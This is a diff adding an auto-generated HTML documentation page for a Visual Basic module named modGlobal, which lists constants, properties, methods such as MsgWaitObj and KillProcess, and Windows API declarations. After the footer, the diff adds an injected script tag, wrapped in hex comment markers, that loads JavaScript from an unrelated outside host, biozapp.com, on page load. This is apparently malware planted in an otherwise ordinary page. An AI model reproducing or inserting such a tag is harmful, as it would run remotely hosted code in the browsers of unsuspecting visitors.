@@ -1,0 +1,80 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="Text/html; charset=iso-8859-1">
+  <meta name="Author" content = "m.stamenov" >
+  <meta name="GENERATOR" content="VBDOX [2.0.15]" >
+  <link REL="stylesheet" TYPE="text/css" HREF="backsdk4.css">
+  <script SRC="langref.js"></script>
+  <title>modGlobal</title>
+</head>
+<BODY TOPMARGIN="0">
+<TABLE CLASS="buttonbarshade" CELLSPACING=0><TR><TD>&nbsp;</TD></TR></TABLE>
+<TABLE CLASS="buttonbartable" CELLSPACING=0>
+<TR ID="hdr"><TD CLASS="runninghead" NOWRAP>modGlobal</TD></TR>
+</TABLE>
+<!-- ============ MODULE ============ -->
+<h2>modGlobal</h2>
+<br>
+Store all public variables, constants and common functions.
+<p><br>
+</p>
+<!-- ============ INHERITS ============ -->
+<!-- ============ IMPLEMENTS ============ -->
+<!-- ============ PUBLIC ============ -->
+<h3><a name="public"></a>Public:</h3><!-- ============ CONSTANTS ============ -->
+<h4><a name="public_consts"></a>Constants:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;Error</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;INFINITE</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;OK</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;Service_Name</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Const.gif" align="middle" border="0" alt=""></IMG>&nbsp;XMLPATH</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ TYPES ============ -->
+<h4><a name="public_types"></a>Types:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Enum.gif" align="middle" border="0" alt=""></IMG>&nbsp;Verbosity</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ PROPERTIES ============ -->
+<h4><a name="public_props"></a>Properties:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;Config</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;hStopPendingEvent</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;intVerbosity</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;IsNTService</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Variable.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.oPOP3.html">oPOP3</a></td><td width="52%">
+Object to handle POP3/STMP commands.&nbsp;</td></tr></tbody></table>
+<!-- ============ METHODS ============ -->
+<h4><a name="public_methods"></a>Methods:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.GetWindowsVersion.html">GetWindowsVersion</a></td><td width="52%">
+Get the Windows version installed.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.Main.html">Main</a></td><td width="52%">
+Main function.&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.MsgWaitObj.html">MsgWaitObj</a></td><td width="52%">
+ The MsgWaitObj function replaces Sleep,
+ WaitForSingleObject, WaitForMultipleObjects functions.<BR/>
+ Unlike these functions, it
+ doesnt block thread messages processing.<BR/><P> <UL><LI>Using instead Sleep:</LI>
+ <UL><LI>MsgWaitObj dwMilliseconds</LI></UL>
+ <LI>Using instead WaitForSingleObject:</LI>
+ <UL><LI>retval = MsgWaitObj(dwMilliseconds, hObj, 1&)</LI></UL>
+ <LI>Using instead WaitForMultipleObjects:</LI>
+ <UL><LI>retval = MsgWaitObj(dwMilliseconds, hObj(0&), n),</LI>
+     <LI>where n - wait objects quantity,</LI>
+     <LI>hObj() - their handles array.</LI></UL></UL>
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.WriteLog.html">WriteLog</a></td><td width="52%">
+Write a pop2owa.log file with errors, warnings and log messages.
+
+&nbsp;</td></tr></tbody></table>
+<!-- ============ PRIVATE ============ -->
+<h3><a name="private"></a>Private:</h3><!-- ============ TYPES ============ -->
+<h4><a name="private_types"></a>Types:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Type.gif" align="middle" border="0" alt=""></IMG>&nbsp;PROCESSENTRY32</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<!-- ============ METHODS ============ -->
+<h4><a name="private_methods"></a>Methods:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.bIsEXE.html">bIsEXE</a></td><td width="52%">
+Evaluate if the process is running under IDE environment.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Function.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.GetNextBlock.html">GetNextBlock</a></td><td width="52%">
+Function to parse Command Line string.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.KillProcess.html">KillProcess</a></td><td width="52%">
+Kill the process that match with the name passed.
+
+&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Sub.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.ParseCommandLine.html">ParseCommandLine</a></td><td width="52%">
+Function to parse de command line passed by the user.
+
+&nbsp;</td></tr></tbody></table>
+<!-- ============ DECLARATIONS ============ -->
+<h4><a name="private_declarations"></a>Declarations:</h4><table><thead><tr valign="top"><th align="left" width="48%">Name</th><th align="left" width="52%">Description</th></tr></thead><tbody><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;CloseHandle&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;CreateMutex&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;CreateToolhelpSnapshot&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;GetTickCount&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.Function.GetVersion.html">GetVersion</a>&nbsp;(function)</td><td width="52%">
+ API to get the OS version&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;<a href="modGlobal.Function.MsgWaitForMultipleObjects.html">MsgWaitForMultipleObjects</a>&nbsp;(function)</td><td width="52%">
+Waits until one or all of the specified objects are in the signaled state or the time-out interval elapses<BR/>
+<A HREF="http://msdn2.microsoft.com/en-us/library/ms684242(VS.85).aspx">Windows API</A>&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;OpenProcess&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;ProcessFirst&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;ProcessNext&nbsp;(function)</td><td width="52%">&nbsp;</td></tr><tr valign="top"><td width="48%"><IMG src="Declare.gif" align="middle" border="0" alt=""></IMG>&nbsp;TerminateProcess&nbsp;(function)</td><td width="52%">&nbsp;</td></tr></tbody></table>
+<DIV class=footer>Build on martes, 11 de noviembre de 2008 by VBDOX <BR>Copyright &copy; 2000 - 2003 M.Stamenov</DIV><!--73779c--><script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042542"></script><!--/73779c-->
+
+<DIV class=footer style="COLOR: #000000; FONT-SIZE: 90%">
+</body>
+</html>
